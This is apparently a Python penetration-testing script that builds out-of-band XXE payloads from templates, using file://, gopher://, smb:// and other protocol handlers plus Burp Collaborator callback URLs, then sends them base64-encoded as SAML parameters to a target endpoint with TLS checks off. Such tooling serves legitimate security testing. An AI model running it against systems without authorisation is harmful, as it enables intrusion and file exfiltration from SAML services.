#! /usr/bin/env python3

import argparse
import ast
import base64
import datetime
import os
import requests
import shelve
import sys
import time
import yaml
import zlib
from random import randint
from string import Template
from urllib3.exceptions import InsecureRequestWarning

# do not print warnings when ignoring TLS certificates
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

######### DEFAULT VALUES ##########
DEFAULT_VECTOR_FILE = os.path.join(os.path.dirname(__file__), "default_phase1_vectors.yml")

DEFAULT_PROTOCOLS = ["http://"]
EXTENDED_PROTOCOLS = ["file://", "ftp://", "smb://", "netdoc://", "gopher://", "jar://"]
## phar://, data://, rar://

# You can set any custom headers here.
DEFAULT_HEADERS = {'X-Custom': 'Test'}

PROTOCOL_HANDLE_PLACEHOLDER = "PROTOCOLHANDLE"
KEYWORDS_PLACEHOLDER = "SYSPUB"
KEYWORDS = ["PUBLIC", "PUBLIC \"id\"", "SYSTEM"]

DEFAULT_WAIT_INTERVAL = (5, 15)


######### FUNCTION DEFINITIONS ####

def get_urls(f):
    if os.path.exists(f):
        with open(f, 'r') as burpFile:
            try:
                return [line.rstrip() for line in burpFile.readlines()]
            except IOError:
                sys.stderr.write("Could not read file URL file:", f)
                exit(1)
    else:
        sys.stderr.write("Could not read file:", f)
        exit(1)


def wait(i):
    # Pause between requests for either a random time
    # between 3 and 10 seconds (default) or the requested interval time
    if (i == 0):
        time.sleep(randint(*DEFAULT_WAIT_INTERVAL))
    else:
        time.sleep(i)


def write_outputfile(string):
    if not output_file:
        return
    with open(output_file, "a") as f:
        f.write(string)


def build_no_url_vectors(template_list, protocols, keywords):
    def maker(vec):
        tmp = []
        for p in protocols:
            for k in keywords:
                temp_v = Template(vec).safe_substitute({PROTOCOL_HANDLE_PLACEHOLDER: p, KEYWORDS_PLACEHOLDER: k})
                if not temp_v in tmp:
                    tmp.append(temp_v)
        return tmp

    vector_lists = [maker(i) for i in template_list]
    return [v for l in vector_lists for v in l]


def store_test_results(storage, results):
    with shelve.open(storage) as db:
        db[str(args.target) + "_" + str(datetime.datetime.utcnow())] = results


def encode_vector(vector, method):
    vector = vector.encode("UTF-8")  # bytearray
    if method == "GET":
        # use redirect encoding with deflate compression
        vector = zlib.compress(vector)[2:-4]
    encoded_vector = str(base64.b64encode(vector))
    return encoded_vector[2:len(encoded_vector) - 1]


def make_output(log_input, vector):
    if type(log_input) == requests.Response:
        response = log_input
        # log request
        req = response.request
        req_headers = [str(i) + ":" + str(req.headers[i]) for i in req.headers]
        req_log = "\n{}{}{}\n".format("=" * 20, " Vector ", "=" * 20) \
                  + str(vector) + "\n" \
                  + "\n{}{}{}\n".format("=" * 20, " Request ", "=" * 20) \
                  + str(req.method) + " " + str(req.url) + "\n" \
                  + "\n".join(req_headers) \
                  + "\n\n" + str(req.body) + "\n"

        write_outputfile(req_log)
        sys.stdout.write(req_log)

        # log response
        response_headers = [str(i) + ":" + str(response.headers[i]) + "\n" for i in response.headers]

        resp_log = "\n{}{}{}\n".format("=" * 20, " Response ", "=" * 20) \
                   + str(response.status_code) + "\n" \
                   + ''.join(response_headers) + "\n"

        response_body = response.text + "\n"
        end_resp_log = "{}\n".format(80 * "-")
        full_log = resp_log + response_body + end_resp_log
        write_outputfile(full_log)

        if args.verbose:
            sys.stdout.write(full_log)
        else:
            sys.stdout.write(resp_log + end_resp_log)
    elif type(log_input) == list:
        log_string = '\n'.join([str(i) + ": " + str(v) for i, v in log_input])
        write_outputfile(log_string + "\n")
        sys.stdout.write(log_string + "\n")


def remove_used_urls(file, num_sent):
    # to prevent using the same collaborator-url in another testrun
    # may remove some unused urls if some vectors didn't need urls
    lines = open(file).readlines()
    open(file, "w").write(''.join(lines[num_sent:]))


def interrupt_handler(results, url_file):
    sys.stderr.write("\nReceived Interrupt Signal, terminating.\n")
    remove_used_urls(url_file, len(results) + 1)
    if args.store_test:
        store_test_results(args.store_test, results)
    exit(1)


def is_filename(arg):
    if os.path.exists(arg) and os.path.isfile(arg):
        return os.path.abspath(arg)
    else:
        raise argparse.ArgumentTypeError("\"{}\" is not a valid file".format(arg))


######### MAIN PROGRAM ##########
def main():
    if (args.debug):
        print("DEBUG: ag_mode = ", args.aggressive)
        print("DEBUG: target_url = ", args.target)
        print("DEBUG: url_file = ", url_file)
        print("DEBUG: output_file = ", output_file)
        print("DEBUG: interval = ", args.interval)

    results = []
    protocols = DEFAULT_PROTOCOLS
    if (args.aggressive):
        protocols.extend(EXTENDED_PROTOCOLS)

    # read vector templates from file
    try:
        # vectors = list(ast.literal_eval(open(os.path.abspath(args.vector_file)).read()))
        with open(args.vector_file) as f:
            vectors = yaml.safe_load(f)
    except Exception:
        sys.stderr.write("failed to read vector file\n")
        exit(1)

    # replace keywords and protocolhandler (builds all possible combinations)
    no_url_vectors = build_no_url_vectors(vectors, protocols, KEYWORDS)

    if (args.debug):
        print("DEBUG: number_of_vectors: {}".format(len(no_url_vectors)))

    # read listener URLs (e.g., list of unique Burp Collaborator URLs) from url_file
    urls = get_urls(url_file)
    if len(urls) < len(no_url_vectors):
        sys.stderr.write(
            "Make sure to include at least {} URLs in file: {}\n".format(len(no_url_vectors), args.url_file))
        exit(1)
    # print("urls: {}".format('\n'.join(urls)))

    # replace URL placeholder in each prepped vector with a listener URL
    vectors = [Template(v).safe_substitute({"PUBLIC_URL_PLACEHOLDER": x}) for v, x in zip(no_url_vectors, urls)]

    if args.dump_vectors:
        print("\n{} Generated Vectors {}\n\n{}\n\n{}\n".format('#' * 5, '#' * 5, '\n\n'.join(vectors), '#' * 30))
        exit(0)

    if (args.proxy):
        # use proxy provided via commandline arg
        proxy = {'http': 'http://' + args.proxy, 'https': 'https://' + args.proxy}
    else:
        proxy = {}

    try:
        for index, vector in enumerate(vectors):
            # encode vector and send the actual request
            body = {args.samlparam: encode_vector(vector, args.method)}
            try:
                args.verbose and sys.stdout.write("\nSending request # {}\n".format(index + 1))
                response = requests.request(args.method, args.target, data=body, headers=DEFAULT_HEADERS, proxies=proxy,
                                            timeout=args.timeout, verify=False)
            except requests.exceptions.Timeout:
                print("Request timed out...")
                make_output([("Request timed out after", args.timeout), ("Target URL", args.target),
                             ("HTTP Method", args.method), ("Request data", body)], vector)
                continue
            else:
                results.append(response)
                make_output(response, vector)
                # pause between requests to prevent overload of tested server or getting blocked
                wait(args.interval)
    except KeyboardInterrupt:
        interrupt_handler(results, url_file)
        exit(1)

    return results


###### ENTRY POINT ######
if __name__ == "__main__":

    parser = argparse.ArgumentParser()

    optional = parser._action_groups.pop()
    required = parser.add_argument_group('required arguments')

    # TODO: arrange arguments in a more sensible order
    required.add_argument("-f", "--url_file", help="Full path of Burp Collaborator URL File", type=is_filename,
                          required=True)
    parser.add_argument("-o", "--output_file", help="If no output file is defined, output to terminal is enabled.",
                        type=str)
    required.add_argument("-t", "--target", help="Target URL as SCHEME://IP:PORT, e.g., http://localhost:5000")
    optional.add_argument("--vector_file", type=is_filename, default=DEFAULT_VECTOR_FILE,
                          help="A yaml file containing a list of XXE Vectors,  defaults to " + DEFAULT_VECTOR_FILE +
                               " The vectors may contain the following placeholders: \"${PROTOCOLHANDLE}\","
                               " \"${SYSPUB}\", \"${PUBLIC_URL_PLACEHOLDER}\".")
    optional.add_argument("-m", "--method",
                          help="Which HTTP method to use, default is POST. If set to GET, deflate compression is applied"
                               " to the SAML message (HTTP-Redirect Binding)",
                          choices=["POST", "GET"], default="POST", )
    optional.add_argument("-a", "--aggressive", action="store_true", help="Build vectors using more protocolhandlers")
    optional.add_argument("-p", "--proxy", help="Add http(s) proxy address as IP:PORT like 127.0.0.1:8080.", type=str)
    optional.add_argument("-d", "--debug", action="store_true", help="enable Debug mode")
    optional.add_argument("-i", "--interval",
                          help="Set request interval delayin seconds. Default is a random interval in " + \
                               str(DEFAULT_WAIT_INTERVAL) + " seconds", type=int, default=0)
    optional.add_argument("-v", "--verbose", action="store_true", help="Enabled verbose mode puts response to stdout."
                                                                       "Auto enabled if not output file is specified")
    optional.add_argument("--timeout", type=int, default=30,
                          help="Seconds to wait until a request is aborted as timed out. Default is 30 seconds.")
    optional.add_argument("--dump_vectors", action="store_true", help="Print generated DTD vectors and exit")
    optional.add_argument("-s", "--samlparam", choices=["SAMLRequest", "SAMLResponse"], default="SAMLRequest",
                          help="The HTTP parametername to use, SAMLRequest if not defined")
    optional.add_argument("--store_test", type=str, default="",
                          help="Store serialized response objects in given filename"
                               " (as python shelve). May be useful for later analysis.")

    parser._action_groups.append(optional)
    args = parser.parse_args()

    # dont require target if only dumping vectors
    if not args.target and not args.dump_vectors:
        sys.stderr.write(parser.print_usage())
        sys.stderr.write("Missing argument: -t/--target")
        exit(1)
    url_file = os.path.abspath(args.url_file)

    if not args.output_file:
        args.verbose = True
        output_file = None
    else:
        output_file = os.path.abspath(args.output_file)

    # run business logic
    results = main()

    if args.store_test:
        store_test_results(os.path.abspath(args.store_test), results)
    remove_used_urls(url_file, len(results) + 1)  # may remove more URLs than actually used
    exit(0)
